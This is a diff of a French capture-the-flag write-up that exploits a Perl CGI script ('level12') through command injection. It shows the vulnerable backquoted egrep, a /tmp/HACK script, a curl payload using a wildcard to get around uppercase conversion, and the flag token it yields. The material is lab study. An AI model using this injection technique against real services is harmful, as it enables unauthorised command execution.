@@ -6,9 +6,9 @@
 *       -> resultat
 */
 
-- Script perl
+- On a un script perl dans le repertoire, on l'affiche.
 cat level12.pl 
-    -> resultat:
+    -> On va analyser le code
 /**********************************************/
 #!/usr/bin/env perl
 # localhost:4646 (curl possible)
@@ -18,8 +18,8 @@ print "Content-type: text/html\n\n";
 sub t {
   $nn = $_[1];
   $xx = $_[0];
-  $xx =~ tr/a-z/A-Z/; -> passe en majuscule toutes les minuscules dans le 1er parametre (LINUX sensible a la casse)
-  $xx =~ s/\s.*//; -> (ref message slack : efface tous les caracteres apres le 1er espace trouver)
+  $xx =~ tr/a-z/A-Z/;                    -> Passe en majuscules toutes les minuscules dans le 1er paramètre (LINUX sensible à la casse)
+  $xx =~ s/\s.*//;                       -> Efface tous les caractères après le 1er espace trouvé)
   @output = `egrep "^$xx" /tmp/xd 2>&1`; -> exploitation possible avec backquotes!!!!
   foreach $line (@output) {
       ($f, $s) = split(/:/, $line);
@@ -41,17 +41,22 @@ sub n {
 n(t(param("x"), param("y")));
 /*********************************************/
 
-- En connaissant les parametres, il faut tout d abord creer un script /tmp/HACK
+- En connaissant les paramètres, il faut tout d'abord créer un script /tmp/HACK
 nano /tmp/HACK:
 #!/bin/sh
 getflag | write level12
--> on utilise le getflag pour obtenir le flag et la commande write qui permet d envoyer un message a un utilisateur donne ici level12 nous! 
+-> on utilise le getflag pour obtenir le flag que l'on redirige dans une pipe avec la commande write.
+La commande write qui permet d'envoyer un message à un utilisateur donné ici level12 donc nous! 
 
-Pour passer le script HACK en parametre, il faut deja le passer en backquotes pour qu il soit execute, il faut remplace tmp par une wildcard * pour eviter que le regex ne change /tmp -> /TMP!
-- il reste plus qu'a exploite la faille en appelant le script hack:
+Pour passer le script HACK en paramètre, il faut déjà le passer en backquotes pour qu'il soit éxecuté, 
+il faut remplacer tmp par une wildcard * pour éviter que le regex ne change /tmp en /TMP!
+
+- il reste plus qu'a exploité la faille en appelant le script hack:
 curl http://localhost:4646?x='`/*/HACK`' ou ./level12.pl `/*/HACK`
     -> Output:
 Broadcast Message from flag12@Snow
         (somewhere) at 14:08 ...
 Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
 Token trouvé! 
+Sources:
+    - Message slack: 
